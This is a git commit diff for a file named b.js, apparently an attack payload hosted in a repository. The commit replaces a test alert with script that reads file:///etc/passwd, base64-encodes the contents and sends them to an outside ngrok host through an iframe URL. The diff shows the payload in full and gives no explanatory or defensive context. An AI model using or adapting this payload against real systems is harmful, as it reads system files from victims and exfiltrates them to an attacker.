308daabf42906a95c4f769446d0bb6094410513f
rohmatariow <79053660+rohmatariow@users.noreply.github.com>
2021-09-01 03:09:35 +0700

    Update b.js

--- b.js
+++ b.js
@@ -1,1 +1,10 @@
-alert('1');
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write('<iframe src="http://853d-111-94-9-137.ngrok.io?data='+b64+'"></iframe>');
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "file:///etc/passwd"); 
+oReq.send();
